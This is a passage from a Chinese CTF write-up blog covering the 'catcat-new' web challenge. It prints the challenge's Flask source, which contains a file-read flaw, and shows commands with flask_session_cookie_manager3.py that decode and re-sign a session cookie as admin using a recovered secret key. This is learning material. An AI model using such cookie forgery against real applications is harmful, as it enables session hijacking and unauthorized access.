+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;import os\nimport uuid\nfrom flask import Flask, request, session, render_template, Markup\nfrom cat import cat\n\nflag = &quot;&quot;\napp = Flask(\n __name__,\n static_url_path=\&#x27;/\&#x27;, \n static_folder=\&#x27;static\&#x27; \n)\napp.config[\&#x27;SECRET_KEY\&#x27;] = str(uuid.uuid4()).replace(&quot;-&quot;, &quot;&quot;) + &quot;*abcdefgh&quot;\nif os.path.isfile(&quot;/flag&quot;):\n flag = cat(&quot;/flag&quot;)\n os.remove(&quot;/flag&quot;)\n\n@app.route(\&#x27;/\&#x27;, methods=[\&#x27;GET\&#x27;])\ndef index():\n detailtxt = os.listdir(\&#x27;./details/\&#x27;)\n cats_list = []\n for i in detailtxt:\n cats_list.append(i[:i.index(\&#x27;.\&#x27;)])\n \n return render_template(&quot;index.html&quot;, cats_list=cats_list, cat=cat)\n\n\n\n@app.route(\&#x27;/info\&#x27;, methods=[&quot;GET&quot;, \&#x27;POST\&#x27;])\ndef info():\n filename = &quot;./details/&quot; + request.args.get(\&#x27;file\&#x27;, &quot;&quot;)\n start = request.args.get(\&#x27;start\&#x27;, &quot;0&quot;)\n end = request.args.get(\&#x27;end\&#x27;, &quot;0&quot;)\n name = request.args.get(\&#x27;file\&#x27;, &quot;&quot;)[:request.args.get(\&#x27;file\&#x27;, &quot;&quot;).index(\&#x27;.\&#x27;)]\n \n return render_template(&quot;detail.html&quot;, catname=name, info=cat(filename, start, end))\n \n\n\n@app.route(\&#x27;/admin\&#x27;, methods=[&quot;GET&quot;])\ndef admin_can_list_root():\n if session.get(\&#x27;admin\&#x27;) == 1:\n return flag\n else:\n session[\&#x27;admin\&#x27;] = 0\n return &quot;NoNoNo&quot;\n\n\n\nif __name__ == \&#x27;__main__\&#x27;:\n app.run(host=\&#x27;0.0.0.0\&#x27;, debug=False, port=5637)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>交给ai分析后得到需要<strong>修改cookie</strong>来验证：</p>
+<p><img src="/../images/image-20250328130926750-1743138567595-1.png" alt="image-20250328130926750"></p>
+<h3 id="2-cookie劫持："><a href="#2-cookie劫持：" class="headerlink" title="2.cookie劫持："></a>2.cookie劫持：</h3><p>得到的cookie：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session=eyJhZG1pbiI6MH0.Z-Yssw.DcEK7I6kSzMq9rng-AyNK8lH20U</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>第一部分</strong>（<code>eyJhZG1pbiI6MH0</code>）：Base64 编码的会话数据，解码后是 <code>&#123;&quot;admin&quot;: 0&#125;</code>。</li>
+<li><strong>第二、三部分</strong>：签名（<code>Z-Yssw</code>）和 HMAC（<code>DcEK7I6kSzMq9rng-AyNK8lH20U</code>），用于验证数据完整性。</li>
+</ul>
+<h4 id="直接访问-proc-self-maps-获取可读内容的内存映射"><a href="#直接访问-proc-self-maps-获取可读内容的内存映射" class="headerlink" title="直接访问**&#x2F;proc&#x2F;self&#x2F;maps**获取可读内容的内存映射"></a>直接访问**&#x2F;proc&#x2F;self&#x2F;maps**获取可读内容的内存映射</h4><p><strong>&#x2F;man是无法访问，只能写脚本了</strong></p>
+<h4 id="脚本爆破得到cookie-key"><a href="#脚本爆破得到cookie-key" class="headerlink" title="脚本爆破得到cookie_key:"></a>脚本爆破得到cookie_key:</h4><p><img src="/../images/image-20250328175909797-1743155951017-9.png" alt="image-20250328175909797"></p>
+<h4 id="使用工具解密："><a href="#使用工具解密：" class="headerlink" title="使用工具解密："></a>使用工具解密：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s <span class="string">&quot;serect_key&quot;</span> -c <span class="string">&quot;session&quot;</span>（session通过抓包获取）。</span><br><span class="line">eg：</span><br><span class="line">python flask_session_cookie_manager3.py decode -s <span class="string">&quot;7cf9bdae7e8c4369be921a8842001d09*abcdefgh&quot;</span> -c <span class="string">&quot;eyJhZG1pbiI6MH0.Z-aAxg.ZVpB2BFWFqW9tt51nq2dhfdF-dg&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../images/image-20250328190215212-1743159736210-11.png" alt="image-20250328190215212"></p>
+<h4 id="使用工具加密："><a href="#使用工具加密：" class="headerlink" title="使用工具加密："></a>使用工具加密：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s <span class="string">&quot;serect_key&quot;</span> -t <span class="string">&quot;data&quot;</span> (data为想要修改的数据)。</span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s <span class="string">&quot;7cf9bdae7e8c4369be921a8842001d09*abcdefgh&quot;</span> -t <span class="string">&quot;&#123;&#x27;admin&#x27;: 1&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250328192024117-1743160825441-13.png" alt="image-20250328192024117"></p>
+<p>最后虽然成功生成了。。。但是不知道是bug还是什么</p>
+<p><strong>无法得出flag！！！！！</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/covers/reimu and marisa.jpg" data-sizes="auto" alt="攻防世界-misc" class="lazyload">
+          
+        
+        <a href="/2025/03/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            攻防世界-misc
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/辉夜02.jpg" data-sizes="auto" alt="一些查询命令" class="lazyload">
+        
+      
+      <a href="/2025/03/23/%E4%B8%80%E4%BA%9B%E6%9F%A5%E8%AF%A2%E5%91%BD%E4%BB%A4/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          一些查询命令
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php-rce"><span class="toc-number">1.</span> <span class="toc-text">php_rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%EF%BC%9A%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91%E7%9A%84%EF%BC%9F"><span class="toc-number">1.0.1.</span> <span class="toc-text">一、原理解析：漏洞是如何触发的？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8F%82%E6%95%B0%E6%8B%86%E8%A7%A3"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">1. 参数拆解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-function-call-user-func-array"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">2. function&#x3D;call_user_func_array</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-vars-0-system-%E5%92%8C-vars-1-id"><span class="toc-number">1.0.1.3.</span> <span class="toc-text">3. vars[0]&#x3D;system 和 vars[1][]&#x3D;id</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mfw"><span class="toc-number">2.</span> <span class="toc-text">mfw</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%8C%E6%89%AB%E6%8F%8F%E7%BD%91%E7%AB%99%E5%8F%91%E7%8E%B0%E6%9C%89%E5%A4%A7%E9%87%8F%E7%9A%84git%E6%96%87%E4%BB%B6%EF%BC%8C%E5%BA%94%E8%AF%A5%E6%98%AFGit%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">2.0.1.</span> <span class="toc-text">1.信息收集，扫描网站发现有大量的git文件，应该是Git文件泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-githacker%EF%BC%9F"><span class="toc-number">2.0.2.</span> <span class="toc-text">2.githacker？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%9B%B4%E6%8E%A5%E7%9C%8Bwp%EF%BC%9A"><span class="toc-number">2.0.3.</span> <span class="toc-text">3.直接看wp：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E6%9E%84%E5%BB%BA"><span class="toc-number">2.0.3.1.</span> <span class="toc-text">文件路径构建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1-assert-%E6%A3%80%E6%9F%A5"><span class="toc-number">2.0.3.2.</span> <span class="toc-text">第一次 assert 检查</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%94%B9%E8%BF%9B%E4%BB%A3%E7%A0%81"><span class="toc-number">2.0.4.</span> <span class="toc-text">4.改进代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%94%B9%E8%BF%9B%E7%82%B9"><span class="toc-number">2.0.5.</span> <span class="toc-text">安全改进点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4"><span class="toc-number">2.0.5.1.</span> <span class="toc-text">1. 输入过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8-assert-%E5%87%BD%E6%95%B0"><span class="toc-number">2.0.5.2.</span> <span class="toc-text">2. 避免使用 assert 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%B7%AF%E5%BE%84%E6%A3%80%E6%9F%A5"><span class="toc-number">2.0.5.3.</span> <span class="toc-text">3. 路径检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E6%80%A7%E6%A3%80%E6%9F%A5"><span class="toc-number">2.0.5.4.</span> <span class="toc-text">4. 文件存在性检查</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-05"><span class="toc-number">3.</span> <span class="toc-text">ics-05</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%81"><span class="toc-number">3.0.1.</span> <span class="toc-text">可能是文件包含漏洞！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.0.2.</span> <span class="toc-text">代码注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">3.0.3.</span> <span class="toc-text">构造代码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload%EF%BC%9A"><span class="toc-number">3.0.4.</span> <span class="toc-text">最终payload：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.0.4.1.</span> <span class="toc-text">1.漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-PHP%E7%9A%84preg-replace%E5%87%BD%E6%95%B0%E4%B8%8E-e%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-number">3.0.4.1.1.</span> <span class="toc-text">(1) PHP的preg_replace函数与&#x2F;e修饰符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.0.4.1.2.</span> <span class="toc-text">(2) 漏洞代码示例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E5%8F%82%E6%95%B0%E6%9E%84%E9%80%A0"><span class="toc-number">3.0.4.1.3.</span> <span class="toc-text">(3) 攻击参数构造</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B%E5%88%86%E8%A7%A3"><span class="toc-number">3.0.4.2.</span> <span class="toc-text">2. 攻击过程分解</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E9%98%B6%E6%AE%B5"><span class="toc-number">3.0.4.2.1.</span> <span class="toc-text">(1) 正则匹配阶段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%98%B6%E6%AE%B5"><span class="toc-number">3.0.4.2.2.</span> <span class="toc-text">(2) 代码执行阶段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%9C"><span class="toc-number">3.0.4.2.3.</span> <span class="toc-text">(3) 输出结果</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%85%B3%E9%94%AE%E7%BB%86%E8%8A%82%E8%AF%B4%E6%98%8E"><span class="toc-number">3.0.4.3.</span> <span class="toc-text">3. 关键细节说明</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%B8%BA%E4%BD%95%E7%A9%BA%E6%A0%BC%E7%94%A8-%E6%9B%BF%E4%BB%A3%EF%BC%9F"><span class="toc-number">3.0.4.3.1.</span> <span class="toc-text">(1) 为何空格用+替代？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E7%9A%84%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6"><span class="toc-number">3.0.4.3.2.</span> <span class="toc-text">(2) &#x2F;e修饰符的版本限制</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-python-template-injection"><span class="toc-number">4.</span> <span class="toc-text">Web_python_template_injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unseping"><span class="toc-number">5.</span> <span class="toc-text">unseping</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8E%E6%98%AF%E6%9E%84%E9%80%A0%EF%BC%9A"><span class="toc-number">5.0.1.</span> <span class="toc-text">于是构造：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">5.0.2.</span> <span class="toc-text">\绕过：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">5.0.3.</span> <span class="toc-text">空格绕过:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E6%9B%BF%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">5.0.4.</span> <span class="toc-text">&#x2F;代替绕过：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%91%BD%E4%BB%A4%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90"><span class="toc-number">5.0.5.</span> <span class="toc-text">1. 命令结构解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload%EF%BC%9A-1"><span class="toc-number">5.0.6.</span> <span class="toc-text">最终payload：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E6%96%B9%E6%B3%95-chr%E6%B3%95"><span class="toc-number">5.0.7.</span> <span class="toc-text">错误方法(chr法)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E7%9A%84-chr-%E7%BB%95%E8%BF%87%E5%A4%B1%E8%B4%A5%EF%BC%9F"><span class="toc-number">5.0.7.1.</span> <span class="toc-text">为什么你的 chr 绕过失败？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%B8%BA%E4%BB%80%E4%B9%88-SSTI-%E4%B8%AD-chr-%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%EF%BC%9F"><span class="toc-number">5.0.7.2.</span> <span class="toc-text">3. 为什么 SSTI 中 chr 可以绕过？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-include"><span class="toc-number">5.0.8.</span> <span class="toc-text">file_include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A%E5%88%A9%E7%94%A8%E4%BA%86%E8%BD%AC%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.0.9.</span> <span class="toc-text">总结：利用了转码漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E5%99%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">5.0.10.</span> <span class="toc-text">其他常见过滤器示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B"><span class="toc-number">5.0.10.1.</span> <span class="toc-text">(1) 压缩与解压</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86"><span class="toc-number">5.0.10.2.</span> <span class="toc-text">(2) 字符串处理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%A4%9A%E8%BF%87%E6%BB%A4%E5%99%A8%E9%93%BE"><span class="toc-number">5.0.10.3.</span> <span class="toc-text">(3) 多过滤器链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2"><span class="toc-number">5.0.10.4.</span> <span class="toc-text">(4) 字符替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86"><span class="toc-number">5.0.10.5.</span> <span class="toc-text">(5) 加密与解密</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%B8%8D%E5%90%8C%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E5%AE%9E%E6%88%98%E7%94%A8%E9%80%94"><span class="toc-number">5.0.11.</span> <span class="toc-text">3. 不同过滤器的实战用途</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E9%80%94-1%EF%BC%9A%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1%E4%BB%A3%E7%A0%81"><span class="toc-number">5.0.11.1.</span> <span class="toc-text">用途 1：绕过死亡代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E9%80%94-2%EF%BC%9A%E9%9A%90%E8%97%8F%E6%95%8F%E6%84%9F%E5%AD%97%E7%AC%A6"><span class="toc-number">5.0.11.2.</span> <span class="toc-text">用途 2：隐藏敏感字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E9%80%94-3%EF%BC%9A%E5%A4%84%E7%90%86%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6"><span class="toc-number">5.0.11.3.</span> <span class="toc-text">用途 3：处理不可见字符</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">5.0.12.</span> <span class="toc-text">4. 防御建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.0.13.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#catcat-new"><span class="toc-number">6.</span> <span class="toc-text">catcat-new</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%B7%E4%BD%93%E5%8F%82%E8%80%83%E4%B8%93%E9%97%A8%E8%AE%B2%E8%A7%A3"><span class="toc-number">6.0.1.</span> <span class="toc-text">1.文件包含具体参考专门讲解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-cookie%E5%8A%AB%E6%8C%81%EF%BC%9A"><span class="toc-number">6.0.2.</span> <span class="toc-text">2.cookie劫持：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE-proc-self-maps-%E8%8E%B7%E5%8F%96%E5%8F%AF%E8%AF%BB%E5%86%85%E5%AE%B9%E7%9A%84%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84"><span class="toc-number">6.0.2.1.</span> <span class="toc-text">直接访问**&#x2F;proc&#x2F;self&#x2F;maps**获取可读内容的内存映射</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E7%88%86%E7%A0%B4%E5%BE%97%E5%88%B0cookie-key"><span class="toc-number">6.0.2.2.</span> <span class="toc-text">脚本爆破得到cookie_key:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%AF%86%EF%BC%9A"><span class="toc-number">6.0.2.3.</span> <span class="toc-text">使用工具解密：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E5%8A%A0%E5%AF%86%EF%BC%9A"><span class="toc-number">6.0.2.4.</span> <span class="toc-text">使用工具加密：</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Flight-star" class="lazyload">
+  <div class="sidebar-author-name">Flight-star</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">36</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep"></span>
+      Flight-star
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        26.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:56
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php-rce"><span class="toc-number">1.</span> <span class="toc-text">php_rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%EF%BC%9A%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91%E7%9A%84%EF%BC%9F"><span class="toc-number">1.0.1.</span> <span class="toc-text">一、原理解析：漏洞是如何触发的？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8F%82%E6%95%B0%E6%8B%86%E8%A7%A3"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">1. 参数拆解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-function-call-user-func-array"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">2. function&#x3D;call_user_func_array</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-vars-0-system-%E5%92%8C-vars-1-id"><span class="toc-number">1.0.1.3.</span> <span class="toc-text">3. vars[0]&#x3D;system 和 vars[1][]&#x3D;id</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mfw"><span class="toc-number">2.</span> <span class="toc-text">mfw</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%8C%E6%89%AB%E6%8F%8F%E7%BD%91%E7%AB%99%E5%8F%91%E7%8E%B0%E6%9C%89%E5%A4%A7%E9%87%8F%E7%9A%84git%E6%96%87%E4%BB%B6%EF%BC%8C%E5%BA%94%E8%AF%A5%E6%98%AFGit%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">2.0.1.</span> <span class="toc-text">1.信息收集，扫描网站发现有大量的git文件，应该是Git文件泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-githacker%EF%BC%9F"><span class="toc-number">2.0.2.</span> <span class="toc-text">2.githacker？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%9B%B4%E6%8E%A5%E7%9C%8Bwp%EF%BC%9A"><span class="toc-number">2.0.3.</span> <span class="toc-text">3.直接看wp：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E6%9E%84%E5%BB%BA"><span class="toc-number">2.0.3.1.</span> <span class="toc-text">文件路径构建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1-assert-%E6%A3%80%E6%9F%A5"><span class="toc-number">2.0.3.2.</span> <span class="toc-text">第一次 assert 检查</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%94%B9%E8%BF%9B%E4%BB%A3%E7%A0%81"><span class="toc-number">2.0.4.</span> <span class="toc-text">4.改进代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 